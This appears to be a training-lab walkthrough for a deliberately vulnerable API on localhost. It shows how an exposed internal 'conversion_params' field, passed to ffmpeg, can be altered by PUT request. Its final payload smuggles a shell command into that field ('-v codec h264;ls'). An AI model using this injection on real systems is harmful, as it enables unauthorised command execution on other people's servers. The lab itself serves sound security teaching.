# API3_2019_Excessive_Data_Exposure

The application exposes sensitive data to unauthorized users. It lets an attacker access sensitive data and gain unauthorized access to the application.

## Challenge 5 - Find an API endpoint that leaks an internal property of a video

1. Analyze the [endpoints](endpoints.md) and focus on the `video` endpoints;
2. Use Postman to upload the sample video `car.mp4`. The request is a `POST` to `http://localhost:8888/identity/api/v2/user/videos` that sends the video with a `multipart/form-data` payload. The response is a JSON with the video's metadata, including the `id` and `conversion_params` properties.

```json
{
    "id": 34,
    "video_name": "car.mp4",
    "conversion_params": "-v codec h264",
    "profileVideo": "data:image/jpeg;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQADYhVtZGF0AAAACwYAB4D3MQAbd0CAAAAACAYBBAAACBCAAAABs2W4BAB/7IN6KT/...."
}
```

The `conversion_params` is particularly interesting because it contains the video's conversion parameters. The application uses the `ffmpeg` library to convert the video to a different format. The `conversion_params` property passes the conversion parameters to the `ffmpeg` library.
Attempt to access the video's metadata by sending a `GET` request to `http://localhost:8888/identity/api/v2/user/videos/34`. The response is a JSON with the video's metadata, including the `id` and `conversion_params` properties.

```json
{
    "id": 34,
    "video_name": "car.mp4",
    "conversion_params": "-v codec h264",
    "profileVideo": "data:image/jpeg;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQADYhVtZGF0AAAACwYAB4D3MQAbd0CAAAAACAYBBAAACBCAAAABs2W4BAB/7IN6KT/...."
}
```

Now try to modify the name of the video by sending a `PUT` request to `http://localhost:8888/identity/api/v2/user/videos/34` with the following payload:

```json
{
    "video_name": "newname.mp4"
}
```

Now try to modify the whole payload and send a PUT request appending something to the conversion parameters:

```json
{
    "id": 34,
    "video_name": "newname.mp4",
    "conversion_params": "-v codec h264;ls",
}
```

The response is a JSON with the video's metadata, including the `id` and `conversion_params` properties.

```json
{
    "id": 34,
    "video_name": "newname.mp4",
    "conversion_params": "-v codec h264;ls",
    "profileVideo": "data:image/jpeg;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQADYhVtZGF0AAAACwYAB4D3MQAbd0CAAAAACAYBBAAACBCAAAABs2W4BAB/7IN6KT/...."
}
```

Strike! Now it is all in the hands of your deepest hacker's fantasy how to leverage it.
